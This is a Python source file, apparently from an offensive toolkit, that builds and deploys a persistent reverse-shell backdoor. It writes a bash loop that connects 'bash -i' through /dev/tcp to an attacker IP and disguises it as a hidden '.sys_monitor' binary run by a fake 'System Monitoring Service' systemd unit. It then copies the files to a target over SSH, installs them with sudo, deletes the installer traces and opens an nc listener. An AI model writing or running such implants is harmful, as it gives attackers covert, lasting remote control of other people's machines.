import subprocess
from collections.abc import Callable
from ssh_connection import SSHConnection


class RSHConnection:
    def __init__(self, attacker_ip: str) -> None:
        self.attacker_ip: str = attacker_ip
        self.port: int = 10000
        self.hosts: dict[str, int] = {}
        self.ssh: SSHConnection = SSHConnection()
        self.payload_path: str = "/tmp/.sys_monitor"
        self.service_path: str = "/tmp/sys-monitor.service"
        self.install_script_path: str = "/tmp/install.sh"

    def _is_port_available(self, port: int) -> bool:
        try:
            result = subprocess.run(
                ["nc", "-z", "-w", "1", "127.0.0.1", str(port)],
                capture_output=True,
                timeout=2,
            )
            return result.returncode != 0
        except Exception:
            return False

    def _get_available_port(self) -> int:
        while not self._is_port_available(self.port):
            self.port += 1
        return self.port

    def create_payload(self) -> None:
        self.port = self._get_available_port()
        payload = f"""#!/bin/bash
        while true; do
            bash -c 'bash -i >& /dev/tcp/{self.attacker_ip}/{self.port} 0>&1'
            sleep 60
        done
        """
        with open(self.payload_path, "w") as f:
            f.write(payload)

    def create_service(self) -> None:
        service = """[Unit]
        Description=System Monitoring Service
        After=network.target

        [Service]
        Type=simple
        ExecStart=/usr/local/bin/.sys_monitor
        Restart=always
        RestartSec=30

        [Install]
        WantedBy=multi-user.target
        """
        with open(self.service_path, "w") as f:
            f.write(service)


    def create_install_script(self) -> None:
        install_script = f"""#!/bin/bash
        cp {self.payload_path} /usr/local/bin/.sys_monitor
        chmod +x /usr/local/bin/.sys_monitor
        cp {self.service_path} /etc/systemd/system/sys-monitor.service
        systemctl daemon-reload
        systemctl enable sys-monitor
        systemctl start sys-monitor
        rm {self.payload_path}
        rm {self.service_path}
        rm /tmp/install.sh
        """

        with open(self.install_script_path, "w") as f:
            f.write(install_script)


    def deploy(self, target_ip: str) -> int:
        self.create_payload()
        self.create_service()

        self.ssh.connect(target_ip)
        self.ssh.scp(self.payload_path, self.payload_path)
        self.ssh.scp(self.service_path, self.service_path)

        self.create_install_script()

        self.ssh.scp(self.install_script_path, self.install_script_path)
        self.ssh.execute_quiet(f"sudo bash {self.install_script_path}")

        self.hosts[target_ip] = self.port
        return self.port

    def listen(self) -> None:
        print(f"Listening on port {self.port}... (Ctrl+C to stop)")
        subprocess.run(["nc", "-lvnp", str(self.port)])

    def cleanup(self, target_ip: str) -> None:
        if target_ip not in self.hosts:
            print(f"Host {target_ip} not in hosts")
            return

        cleanup_script = """#!/bin/bash
        systemctl stop sys-monitor
        systemctl disable sys-monitor
        rm /etc/systemd/system/sys-monitor.service
        rm /usr/local/bin/.sys_monitor
        systemctl daemon-reload
        rm /tmp/cleanup.sh
        """

        with open("/tmp/cleanup.sh", "w") as f:
            f.write(cleanup_script)

        self.ssh.connect(target_ip)
        self.ssh.scp("/tmp/cleanup.sh", "/tmp/cleanup.sh")
        self.ssh.execute_quiet(f"sudo bash /tmp/cleanup.sh")

        del self.hosts[target_ip]
        print(f"Cleaned up {target_ip}")
